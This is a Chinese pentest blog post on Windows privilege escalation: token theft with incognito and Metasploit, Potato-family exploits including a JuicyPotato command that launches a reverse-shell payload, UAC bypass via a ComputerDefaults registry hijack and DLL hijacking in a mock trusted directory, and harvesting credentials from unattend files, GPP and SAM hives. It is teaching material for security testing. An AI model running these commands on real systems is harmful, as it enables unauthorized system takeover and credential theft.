+<h6 id="常规令牌窃取操作"><a href="#常规令牌窃取操作" class="headerlink" title="常规令牌窃取操作"></a><strong>常规令牌窃取操作</strong></h6><p>常规的令牌操纵往往用来将管理员权限提升为<code>SYSTEM</code>、<code>TrustedInstaller</code>等更高系统权限, 实战中如果本地管理员账户因为某些组策略设置无法获取某些特权可以使用令牌窃取假冒<code>NT AUTHROITY\SYSTEM</code>的令牌, 以获取更高的系统权限。此外令牌窃取还常被用于降权或用户切换操作</p>
+<ol>
+<li><p><strong>使用<a target="_blank" rel="noopener" href="https://github.com/milkdevil/incognito2"><code>incognito.exe</code></a>窃取令牌</strong></p>
+<p>将incognito.exe上传到目标主机，列举当前主机上的所有访问令牌</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u <span class="comment">#查看哪些用户的token可以被获取</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>如图所示，”Delegation Tokens Available”条目中列举出了NT AUTHORITY\SYSTEM账户的令牌</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401115856390.png" alt="image-20230401115856390" style="zoom:80%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="built_in">whoami</span>   <span class="comment">#窃取NT AUTHORITY\SYSTEM账户的访问令牌并创建进程</span></span><br><span class="line"><span class="comment">#-c参数后为要窃取的令牌  </span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401120051812.png" alt="image-20230401120051812" style="zoom:90%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c <span class="string">&quot;HACK-MY\Marcus&quot;</span> cmd  <span class="comment">#窃取域用户Marcus的访问令牌，实现从本地管理员账户到域用户的切换</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401120126089.png" alt="image-20230401120126089" style="zoom:93%;" />
+
+
+
+<p><strong>2.利用<code>Metasploite</code>窃取令牌</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load incognito     <span class="comment">#导入incognito令牌窃取模块</span></span><br><span class="line">list_tokens -u     <span class="comment">#列出主机上的所有访问令牌</span></span><br><span class="line">impersonate_token <span class="string">&quot;要窃取的令牌名&quot;</span>   <span class="comment">#窃取账户令牌</span></span><br><span class="line">steal_token        <span class="comment">#从指定进程中窃取令牌</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401120914113.png" alt="image-20230401120914113" style="zoom:60%;" />
+
+
+
+<p><strong>3.通过令牌获取<code>TrustedInstaller</code>权限</strong></p>
+<p>通常认为SYSTEM权限为Windows系统中的最高权限。但是即便获取了SYSTEM权限，也不能修改Windows系统文件。例如  <code>C:Windows\servicing</code> 目录拥有SYSTEM权限，但也无法向该目录中写入文件</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401121353587.png" alt="image-20230401121353587" style="zoom:80%;" />
+
+<p>使用<code>icacls</code>命令查看该目录的权限，发现 <code>NT SERVICE\TrustedInstaller</code> 账户对其具有完全控制权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401121526309.png" alt="image-20230401121526309" style="zoom:80%;" />
+
+<blockquote>
+<p>从Windows Vista开始系统内置了一个<code>TrustedInstaller</code>安全主体，拥有修改系统文件权限，专用于对系统进行维护、更新等操作。<code>TrustedInstaller</code>以一个账户组的形式出现，即<code>NT SERVICE\TrustedInstaller</code></p>
+</blockquote>
+<p>通常情况下，测试人员可以通过令牌窃取的方式获取系统<code>TrustedInstaller权限</code>。由于<code>TrustedInstaller</code>本身也是一个服务，当启动该服务时，会运行TrustedInstaller.exe程序，该程序的在系统上的路径为 <code>&quot;C:\Windows\servicing\TrustedInstaller.exe&quot; </code>，其拥有者为<code>NT SERVICE\TrustedInstaller</code>。测试人员可以窃取TrustedInstaller.exe进程的令牌，以提升至<code>TrustedInstaller</code>权限<br>首先，执行以下命令，在目标系统上启动TrustedInstaller服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start TrustedInstaller</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401153435233.png" alt="image-20230401153435233" style="zoom:70%;" />
+
+<p>然后，记录TrustedInstaller.exe进程的PID并执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;PID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从TrustedInstaller.exe进程中窃取令牌</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401153408013.png" alt="image-20230401153408013" style="zoom: 67%;" />
+
+
+
+
+
+<h6 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h6><blockquote>
+<p>前面讲过，使用令牌窃取的前提是用户拥有<code>SeAssignPrimaryTokenPrivilege</code>或<code>SeImpersonatePrivilege</code>特权。这两个特权非常强大，允许用户在另一个用户的安全上下文中运行代码甚至创建新进程。Potato家族正是通过滥用Windows服务账户拥有的这两个特权，将已获取的NT AUTHORITY\SYSTEM账户的访问令牌传入<code>CreateProcess WithTokenW</code>或<code>CreateProcessAsUserA</code>函数进行调用，在NT AUTHORITY\SYSTEM账户的上下文中创建新进程，以提升至SYSTEM权限</p>
+</blockquote>
+<p>在实战场景中，若成功拿到了IIS等服务的<code>WebShell</code>或者通过MSSQL服务的<code>xp_cmdshell</code>成功执行了系统命令，此时获取的服务账户拥有<code>SeImpersonatePrivilege</code>和<code>SeAssignPrimary TokenPrivilege</code>特权，就可以通过Potato家族提升至SYSTEM权限</p>
+<p>1.<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">Rotten Potato</a>烂土豆</p>
+<blockquote>
+<p>Rotten Potato提权的实现机制相当复杂，拦截NTLM身份认证请求，并伪造NT AUTHORITY\SYSTEM账户的访问令牌，大致可以分为以下三个步骤</p>
+<p>1.通过<code>CoGetInstanceFromIStorage</code> API，将一个COM对象(BITS)加载到本地可控的端口(TCP 6666)，并诱骗BITS对象以NT AUTHORITY\SYSTEM 账户的身份向该端口发起NTLM认证<br>2.借助本地RPC 135端口，对BITS对象的认证过程执行中间人攻击(NTLM Relay),同时调用相关API为NT AUTHORITYISYSTEM账户在本地生成一个访问令牌<br>3.通过NT AUTHORITYISYSTEM账户的令牌创建新进程，以获取SYSTEM权限</p>
+</blockquote>
+<p>以Microsoft IIS服务进行演示，假设已获取IIS服务账户的WebShell,执行“whoami &#x2F;priv”命令，可以看到当前账户拥有SeAssignPrimaryTokenPrivilege和SeImpersonatePrivilege特权</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402161945224.png" alt="image-20230402161945224" style="zoom:80%;" />
+
+<p>通过WebShell上线MetaSploit,此时加载incognito模块还不能列举出高权限用户的令牌</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402162100111.png" alt="image-20230402162100111" style="zoom:75%;" />
+
+<p>向目标主机上传Rotten Potato的利用程序(实战中需注意目录权限)，并通过以下命令在Meterpreter中运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -Hc -f rottenpotato.exe</span><br></pre></td></tr></table></figure>
+
+<p>运行RottenPotato.exe后，再次执行”list token-u”命令，就能成功列举出NT AUTHORITYISYSTEM账户的令牌</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402162152610.png" alt="image-20230402162152610" style="zoom:75%;" />
+
+<p>然后使用impersonate_token伪造该令牌，即可获取SYSTEM权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402162209992.png" alt="image-20230402162209992" style="zoom:80%;" />
+
+
+
+<p>2.<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">Juicy Potato</a></p>
+<blockquote>
+<p>Juicy Potato与Rotten Potato的原理几乎完全相同，只是在后者的基础上做了扩展，以便更灵活利用Rotten Potato。Juicy Potato不再像Rotten Potato那样依赖于一个现有的Meterpreter，并且可以自定义COM对象加载的端口，以及根据系统版本更换可用的COM对象</p>
+</blockquote>
+<ol>
+<li><p>上传<code>Juicy Potato</code>的利用程序</p>
+</li>
+<li><p>根据系统操作版本选择一个可用的COM对象</p>
+<p>这个步骤就是烂土豆的拓展, 在<code>RottenPotato</code>中默认选择的是BITS对象, 这个可用对象的CLSID根据脚本获得, 不同的系统有哪些SLID可以参考<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">CLSID</a></p>
+</li>
+<li><p>执行<code>Juicy Potato</code>程序加载可用的COM对象获取SYSTEM权限并运行指定payload程序反弹shell</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\inetpub\wwwroot\reverse_tcp.exe -l 6666 -n 135 -c</span><br><span class="line">&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4]</span><br><span class="line"><span class="comment">#-t,指定要使用CreateProcesswithTokenw和CreateProcessAsUserA()中的哪个函数创建进程</span></span><br><span class="line"><span class="comment">#-p,指定要运行的程序</span></span><br><span class="line"><span class="comment">#-l，指定COM对象加载的端口</span></span><br><span class="line"><span class="comment">#-n,指定本地RPC服务端口，默认为135</span></span><br><span class="line"><span class="comment">#-c,指定要加载的COM对象的CLSID</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402163513534.png" alt="image-20230402163513534" style="zoom:65%;" />
+
+<p>以上两种提权方法仅适用于Windows 10 version 1809和Windows Server 2019之前版本的系统。在之后的版本中，微软通过检查RPC绑定字符串中指定的端口来修复了这个问题，修复后的系统无法通过原来的方法实现中间人攻击</p>
+<p>3.<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer"><code>PrintSpoofer</code></a>(Pipe Potato)</p>
+<p><code>PrintSpoofer</code> 主要利用了打印机组件路径检查中存在的一个Bug, 使得高权限服务能连接到测试人员创建的命令管道, 以获取的高权限账户的令牌来创建新进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrintSpoofer64.exe -i -c <span class="built_in">whoami</span>  <span class="comment">#whoami查看提权是否成功</span></span><br><span class="line">PrintSpoofer64.exe -i -c </span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402162922077.png" alt="image-20230402162922077" style="zoom:80%;" />
+
+
+
+<p>4.Sweet Potato</p>
+<p>集成了上述几种提权方式用于获取SYSTEM权限</p>
+<ol>
+<li>Rotten Potato</li>
+<li>Juicy Potato</li>
+<li><code>RogueWinRm</code></li>
+<li><code>PrintSpoofer</code></li>
+</ol>
+<h6 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h6><blockquote>
+<p>用户账户控制(User Account Control, <strong>UAC</strong>)是Windows操作系统采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置，有助于防止恶意软件损坏计算机。用户账户控制使应用程序和任务始终在非管理员账户的安全上下文中运行，除非管理员专门授予管理员级别的权限。开启用户账户控制后，每个需要使用管理员访问令牌的应用都必须提示征得用户同意</p>
+</blockquote>
+<blockquote>
+<p>UAC限制所有用户包括非RID 500的管理员用户使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。这里所说的非RID 500的用户是指除Administrator以外、位于管理员组中的其他管理员用户。当非RD500的管理员用户登录后，系统会为其创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。标准用户访问令牌包含与管理员访问令牌相同的用户特定信息，只是移除了Windows管理特权和相关SID。标准用户访问令牌用于启动不执行管理任务的应用程序（标准用户应用程序)。当管理员需要执行高权限管理任务时，Windows会自动提示用户予以批准，同意后则允许使用管理员访问令牌</p>
+</blockquote>
+<p>在实战中，如果测试人员可以绕过Windows UAC机制，使非RID 500的管理员账户可以不需用户批准直接使用管理员访问令牌，从而获得全部的管理权限。注意，UAC实际上是一种权限保护机制，而Bypass UAC仅仅是绕过了这一保护机制，本质上并不能将其看作一种真正的提权</p>
+<ul>
+<li><strong>UAC白名单</strong></li>
+</ul>
+<blockquote>
+<p>微软在用户账户控制中为一些系统程序设置了白名单机制，所有白名单中的程序将不再询问，以静默方式自动提升到管理员权限运行，如slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe、rundll332.exe、explorer.exe等。测试人员可以通过对这些白名单程序进行DLL劫持、DLL注入或者注册表劫持等，绕过UAC并提升权限</p>
+</blockquote>
+<p>在寻找白名单程序时，可以使用微软官方提供的工具<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck"><code>Sigcheck</code></a>和<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/strings"><code>Strings</code></a>。白名单程序拥有一个共同的特性，就是Manifest数据中<code>autoElevate</code>属性的值为True。<code>Sigcheck</code>可以检测程序是否具有<code>autoElevate</code>属性，以ComputerDefaults.exe为例，该程序位于 C:\Windows\System32 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe /accepteula -m C:\Windows\System32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401171627852.png" alt="image-20230401171627852" style="zoom:75%;" />
+
+<p>Strings可以找出所有具有<code>autoElevate</code>属性的程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i &quot;autoElevate&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401171644024.png" alt="image-20230401171644024" style="zoom:80%;" />
+
+<p>以ComputerDefaults.exe为例进行分析，通过该程序绕过UAC提权。ComputerDefaults.exe运行后会打开Windows的默认应用</p>
+<p>直接到System32目录下运行ComputerDefaults.exe程序，打开”默认应用”界面，并未出现UAC弹窗</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401230807554.png" alt="image-20230401230807554" style="zoom: 70%;" />
+
+<p>使用进程监控器 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor </a>监控ComputerDefaults.exe进程的所有操作行为，(主要是监控注册表和文件的操作)。可以发现，ComputerDefaults.exe进程会先查询注册表 <code>HKCU\Software\Classes\ms-settings\shell\open\command</code> 中的数据，发现该路径不存在后，继续查询注册表 <code>HKCR\ms-settings\Shell\Open\Command \DelegateExecute</code> 中的数据并读取</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401230936113.png" alt="image-20230401230936113" style="zoom:80%;" />
+
+<p>通常情况下，以”shell\open\command”命名的注册表中存储的可能是可执行文件的路径，程序会读取其中的键值并运行相应的可执行文件。由于ComputerDefaults.exe是UAC白名单中的程序，运行时默认提升了权限，因此在运行该键值中的可执行文件时默认为管理员权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\classes\ms-settings\shell\open\command&quot;</span> /d</span><br><span class="line"><span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /f  <span class="comment">#修改ComputerDefault加载的注册表指向的程序</span></span><br><span class="line">reg add <span class="string">&quot;HKCU\Software\classes\ms-settings\shell\open\command&quot;</span> /v DelegateExecute /t</span><br><span class="line">REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>在注册表HKCU\Software\Classes\<code>ms-settings</code>\shell\open\command（如果没有就创建)中将要执行的攻击载荷路径分别写入”默认”值和”<code>DelegateExecute</code>“值（这里写入的是cmd.exe的路径)。标准用户对该注册表键值有修改权限，并且对HKCU的修改会自动同步到HKCR</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401225958816.png" alt="image-20230401225958816" style="zoom:70%;" />
+
+<p>再次执行Computer Defaults.exe时，恶意程序就会随着ComputerDefaults.exe的启动默认通过UAC控制并以提升的权限运行。如图所示成功获取一个关闭了UAC的命令行窗口</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401230105968.png" alt="image-20230401230105968" style="zoom:67%;" />
+
+<p>上线<code>MetaSploit</code>，执行<code>getsystem</code>命令，可直接提升至SYSTEM权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401230143288.png" alt="image-20230401230143288" style="zoom:66%;" />
+
+
+
+<ul>
+<li><strong>DLL劫持</strong></li>
+</ul>
+<blockquote>
+<p>Windows系统中的很多应用程序并不是一个完整的可执行文件，被分割成一些相对独立的动态链接库(Dynamic Link Library, <strong>DLL</strong>)文件，其中包含程序运行所使用的代码和数据。当应用程序启动时，相应的DLL文件就会被加载到程序进程的内存空间。测试人员可以通过一些手段，欺骗合法的、受信任的应用程序加载任意的DLL文件，从而造成DLL劫持</p>
+<p>当应用程序加载DLL时，如果没有指定DLL的绝对路径，那么程序会以特定的顺序依次在指定路径下搜索待加载的DLL。在开启安全DLL搜索模式(<code>SafeDllSearchMode</code>,Windows XP SP2后默认开启)的情况下，将按以下顺序进行搜索：程序安装目录→系统目录(C:\Windows\System32)→l6位系统目录(C:\Windows\System)→Windows目录(C:Windows)→当前工作目录→PATH环境变量中列出的各目录</p>
+<p>如果将同名的恶意DLL文件放在合法DLL文件所在路径之前的搜索位置，当应用程序搜索DLL时，就会以恶意DLL代替合法的DLL来加载。这就是经典的DLL预加载劫持情景，利用的前提是<strong>拥有对上述目录的写入权限</strong>，并且恶意DLL需要与原始DLL<strong>拥有相同的导出表函数</strong></p>
+<p>基于上述原理，通过劫持UAC白名单程序所加载的DLL文件，测试人员就可以借助白名单程序的自动提升权限来Bypass UAC。注意这些白名单程序所加载的DLL文件几乎都位于系统可信任目录中，而这些目录对标准用户来说通常都是不可写的。因此，要结合模拟可信任目录的内容进行利用</p>
+</blockquote>
+<ul>
+<li><strong>模拟可信任目录</strong></li>
+</ul>
+<blockquote>
+<p>当启动的程序请求自动提升权限时，系统会先读取其可执行文件的Manifest信息，解析<code>autoElevate</code>属性字段的值。如果该字段存在并且值为True,就会认为这是一个可以自动提升权限的可执行文件。并且系统会检查可执行文件的签名，这意味着无法通过构造Manifest信息或冒充可执行文件名来实现自动权限提升。此外系统会检查可执行文件是否位于系统可信任目录中，如C:\Windows\System32目录。当这三个条件全部通过后，则允许程序自动提升权限，有任意一个条件不通过都会被系统拒绝</p>
+</blockquote>
+<p>注意系统在检查可信任目录时，相关函数会自动去掉可执行文件路径中的空格。如果可执行文件位于”C:\Windows \System32”目录（在”Windows”后有一空格，下文统称”模拟可信任目录”)中，系统在检查时会自动去除路径中的空格，这样就通过了最后一个条件的检查。基于此原理，测试人员根据可信任目录来创建一个包含尾随空格的模拟可信任目录，将一个白名单程序复制到模拟可信任目录中，配合DLL劫持等技术即可成功绕过UAC</p>
+<blockquote>
+<p>想要利用模拟可信任目录进行DLL劫持完成提权, 总结就是以下四步:</p>
+<ol>
+<li>找到UAC白名单程序</li>
+<li>创建模拟可信任目录(筛选可写入的目录)</li>
+<li>将程序目录的文件内容全部复制到模拟可信任目录中(保留<code>mainFest</code>中的<code>autoExecute</code>数据字段和签名不变)这里建议直接跑工具<a target="_blank" rel="noopener" href="https://github.com/Apri1y/UACME/blob/master/Compiled/UacInfo64.exe">UacInfo64.exe</a></li>
+<li>将复制过来的某个DLL文件删除, 替换为我们构造好的DLL格式的payload文件</li>
+</ol>
+</blockquote>
+<p>下面以WinSAT.exe程序为例进行演示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md &quot;\\?\C:\Windows &quot;</span><br><span class="line">md &quot;\\?\C:\Windows \System32&quot;</span><br><span class="line">copy C:\Windows\System32\WinSAT.exe &quot;\\?\C:\Windows \System32\WinSAT.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>创建C:\Windows \System32模拟可信任目录，并将白名单程序WinSAT.exe复制到该目录中</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230401235011725.png" alt="image-20230401235011725" style="zoom: 80%;" />
+
+<p>启动模拟可信任目录中的WinSAT.exe，同时使用Process Monitor检测其进程所加载的DLL</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402000733201.png" alt="image-20230402000733201" style="zoom: 80%;" />
+
+<p>可以看到，程序尝试在当前包含空格的目录加载DLL并且都失败了，可以编写一个恶意的DLL文件并将其放入该目录进行DLL劫持，这里选择的是WINMM.dll。注意，构造的恶意DLL需要与原来的DLL具有相同的导出函数。可以使用<code>ExportsToC++</code>(类似的工具还有<code>AheadLib</code>等)来获取原DLL文件的导出函数并自动生成C++代码</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402004448659.png" alt="image-20230402004448659" style="zoom:80%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402004422493.png" alt="image-20230402004422493" style="zoom:67%;" />
+
+<p>简单修改生成代码，在<code>DLLMain</code>入口函数中加入要执行的操作，并通过Visual Studio创建项目，编译生成64位DLL文件<br>将生成的WINMM.dll放入前面创建的模拟可信任目录，运行WinSAT.exe(模拟可信任目录中)后，即可弹出一个关闭了UAC的命令行窗口</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402003217131.png" alt="image-20230402003217131" style="zoom:67%;" />
+
+
+
+<ul>
+<li><strong>相关辅助工具</strong></li>
+</ul>
+<p>1.UACME</p>
+<blockquote>
+<p>UACME是一个专用于绕过Windows UAC的项目，目前已包含70多种<code>BypassUAC</code>的方法在UACME中。每一个Bypass UAC方法都有一个数字编号，由一个名为Akagi.exe的主程序统一调用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Apri1y/UACME">https://github.com/Apri1y/UACME</a> 18年的项目, 在README中详细介绍了47种利用方式以及它的可利用起止版本(里面的unfix看看就行, 还是要自己尝试, 毕竟项目比较老了)且有已编译好的exe可直接使用(一落地就会被杀, 倒是里面的工具<a target="_blank" rel="noopener" href="https://github.com/Apri1y/UACME/blob/master/Compiled/UacInfo64.exe">UacInfo64.exe</a>还挺好用的, 直接列出<code>CLSID</code>的对象说明以及可以dll劫持的白名单程序)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a>   17年的项目，使用的demo编号高达61，但是没有太多编号对应的漏洞介绍</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dotfornet/UACME">https://github.com/dotfornet/UACME</a> 16年的项目，有23个利用方式，且对每个利用方式都要描述且说了从哪个版本(Fixed)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">akagi.exe [key] [param] </span><br><span class="line"># key指定需要使用的方法编号; param指定绕过UAC之后执行的程序或命令,默认启动一个关闭UAC之后的CMD窗口</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.Metasploit</p>
+<p>在<code>msf</code>中集成了十几个可用的<code>bypassuac</code>模块, 直接通过<code>search bypassuac</code>即可搜索查看</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402005255713.png" alt="image-20230402005255713"></p>
+<h6 id="用户凭据操作"><a href="#用户凭据操作" class="headerlink" title="用户凭据操作"></a>用户凭据操作</h6><ul>
+<li>枚举 Unattended 凭据</li>
+</ul>
+<p>无人值守(Unattended)安装允许应用程序在不需要管理员关注下自动安装。无人值守安装的问题是会在系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码，常见的路径如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\syspreg\sysprep.xml</span><br><span class="line">C:\syspreg\system32\sysprep.inf</span><br><span class="line">C:\syspreg\system32\sysprep\sysprep.xml</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\system32\Sysgrep\Unattend.xml</span><br><span class="line">C:\Windows\system32\Sysgrep\Panther\Unattend.xml</span><br></pre></td></tr></table></figure>
+
+<p>测试人员可以全盘搜索上述配置文件，并检索User、Accounts、UserAccounts、LocalAccounts、.Administrator、Password等关键字来获取管理员凭据。<br><code>MetaSploit</code>提供了<code>post/windows/gather/enum_unattend</code>模块，可以从<code>Unattend</code>配置文件中自动化检索出用户密码</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402093916249.png" alt="image-20230402093916249" style="zoom:70%;" />
+
+
+
+<ul>
+<li>获取组策略凭据</li>
+</ul>
+<p>微软在Windows Server 2008 中引入了组策略首选项，允许网络管理员对指定计算机和用户配置特定的设置</p>
+<p>在新建一个组后, 控制器会在SYYVOL共享目录下生成一个xml文件, 该文件保留了组策略更新后的密码</p>
+<blockquote>
+<p>SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹, 主要存放登录脚本,组策略数据以及其他域控制器需要的域信息等，并在所有结果身份验证的域用户或者域信任用户范围内共享</p>
+</blockquote>
+<p>在SYSVOL目录中可以找到一个名为<code>Groups.xml</code>的文件,其中的<code>cpassword</code>字段保存了经过AES 256加密后的用户密码, 微软在2012年公布了加密秘钥, 这就意味着域内用户都可以读取Groups.xml中的密码并使用公开的秘钥进行解密。且由于通过组策略批量修改的本地管理员密码都是相同的, 这就意味着拿到一台机器的本地管理员密码就拿到了域控账户进而通过域管账户拿下整个域                     <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402094433927.png" alt="image-20230402094433927" style="zoom:80%;" /></p>
+<p><code>MetaSploit</code>框架内置<code>post/windows/gather/credentials/gpp</code>模块，可以自动化搜索位于SYSVOL共享目录中的XML,并从中解密出用户密码              <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402094552504.png" alt="image-20230402094552504" style="zoom:70%;" /></p>
+<ul>
+<li><code>HiveNightmare</code></li>
+</ul>
+<blockquote>
+<p>也即Windows提权漏洞(CVE-2021-36934)。由于Windows中多个系统文件的访问控制列表(ACL)过于宽松，使得任何标准用户都可以从系统卷影副本中读取包括SAM、SYSTEM、SECURITY在内的多个系统文件。由于SAM文件是存储用户密码哈希值的安全账户管理器，进而可以获取所有本地用户NTLM Hash值，通过<strong>暴力破解</strong>或<strong>哈希传递</strong>等方法就能实现本地权限提升</p>
+</blockquote>
+<blockquote>
+<p>该漏洞影响Windows 10 Version 1809发布以来的所有Windows版本，包括Windows11,被称为”<code>HiveNightmare</code>“。成功利用此漏洞的测试人员可以使用SYSTEM权限运行任意代码</p>
+</blockquote>
+<blockquote>
+<p>漏洞利用条件：  启用系统保护(默认启动)，系统上存在已创建的系统还原点，系统启用本地管理员用户<br>因此最关键的就是创建系统还原点，那么标准用户可直接从卷影副本中访问和转储SAM、SYSTEM、SECURITY文件</p>
+</blockquote>
+<p>这些文件在系统中的原始路径如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SYSTEM</span><br><span class="line">C:\Windows\System32\config\SECURITY</span><br></pre></td></tr></table></figure>
+
